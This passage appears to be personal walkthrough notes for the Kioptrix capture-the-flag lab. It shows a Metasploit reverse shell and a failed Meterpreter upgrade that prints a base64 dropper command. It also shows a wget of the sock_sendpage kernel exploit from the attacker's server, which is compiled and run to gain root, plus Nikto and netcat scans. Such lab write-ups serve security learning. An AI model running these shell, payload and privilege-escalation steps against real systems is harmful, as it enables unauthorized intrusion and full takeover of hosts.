PAYLOAD => linux/x86/shell/reverse_tcp
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.88.128:4444 
[*] Sending stage (36 bytes) to 192.168.88.130
[*] Command shell session 1 opened (192.168.88.128:4444 -> 192.168.88.130:32801) at 2020-01-02 23:45:52 +0100

whoami
bash: jYj?XIyjXRh//shh/binRSwhoami: No such file or directory
bash-3.00$ ^Z
Background session 1? [y/N]  y
msf5 exploit(multi/handler) > use post/multi/manage/shell_to_meterpreter 
msf5 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.88.128:4433 
[*] Sending stage (985320 bytes) to 192.168.88.130
[*] Meterpreter session 2 opened (192.168.88.128:4433 -> 192.168.88.130:32802) at 2020-01-02 23:47:24 +0100
[-] Error: Unable to execute the following command: "echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towKhYgGgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/jZqLq.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/PQQrZ' < '/tmp/jZqLq.b64' ; chmod +x '/tmp/PQQrZ' ; '/tmp/PQQrZ' & sleep 2 ; rm -f '/tmp/PQQrZ' ; rm -f '/tmp/jZqLq.b64'"
[-] Output: "[1] 4299"
[*] Post module execution completed
```

sadly not working

#### PrivEsc - 'sock_sendpage()' Local Privilege Escalation

local

```bash
searchsploit -m exploits/linux/local/9545.c       
  Exploit: Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/9545
     Path: /usr/share/exploitdb/exploits/linux/local/9545.c                                                                                                                              
File Type: C source, ASCII text, with CRLF line terminators                                                                                                                              
                                                                                                                                
Copied to: /root/kioptrix/shell/9545.c


python3 -m http.server 1234

```

remote

```bash
bash-3.00$ wget http://192.168.88.128:1234/9545.c
--16:14:53--  http://192.168.88.128:1234/9545.c
           => `9545.c'
Connecting to 192.168.88.128:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9,783 (9.6K) [text/plain]

    0K .........                                             100%  621.99 MB/s

16:14:53 (621.99 MB/s) - `9545.c' saved [9783/9783]

bash-3.00$ gcc -o page 9545.c
9545.c:376:28: warning: no newline at end of file
bash-3.00$ ls
9545.c
page
bash-3.00$ chmod +x page
bash-3.00$ ./page
sh: no job control in this shell
sh-3.00# whoami
root
```


### 192.168.88.130 631

```bash
nc 192.168.88.130 631
GET /

HTTP/0.9 403 Forbidden
Date: Thu, 02 Jan 2020 18:14:04 GMT
Server: CUPS/1.1
Content-Language: en_US
Upgrade: TLS/1.0,HTTP/1.1
Connection: close
Content-Type: text/html
Content-Length: 150

<HTML><HEAD><TITLE>403 Forbidden</TITLE></HEAD><BODY><H1>Forbidden</H1>You don't have permission to access the resource on this server.</BODY></HTML>
```

#### Nikto

```bash
nikto -h 192.168.88.130:631
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.88.130
+ Target Hostname:    192.168.88.130
+ Target Port:        631
+ Start Time:         2020-01-02 21:26:25 (GMT1)
---------------------------------------------------------------------------
+ Server: CUPS/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, POST, PUT 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ 26548 requests: 1 error(s) and 5 item(s) reported on remote host
+ End Time:           2020-01-02 21:27:36 (GMT1) (71 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
``` 

### 192.168.88.130 3306

```bash 
nc 192.168.88.130 3306
GjHost '192.168.88.128' is not allowed to connect to this MySQL serverr
``` 

